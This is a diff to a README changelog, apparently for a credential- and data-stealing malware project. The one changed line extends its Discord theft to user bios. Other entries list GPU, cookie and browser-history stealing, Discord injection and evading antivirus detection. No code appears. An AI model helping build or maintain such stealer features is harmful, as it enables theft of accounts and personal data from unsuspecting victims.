@@ -48,7 +48,7 @@
 
 ## <a id="changelog"></a>📝・Changelog
 ```
-- V3.5.5 Steal Global Username from discord
+- V3.5.5 Steal Global Username from discord and bio
 - V3.5.1 Fixed GPU stealing 
 - V3.5 Make it 0 detection back, fixed cookie counting and fixed injection and disabling discord adding it to threads
 - V3.4 Added Browser History Stealer
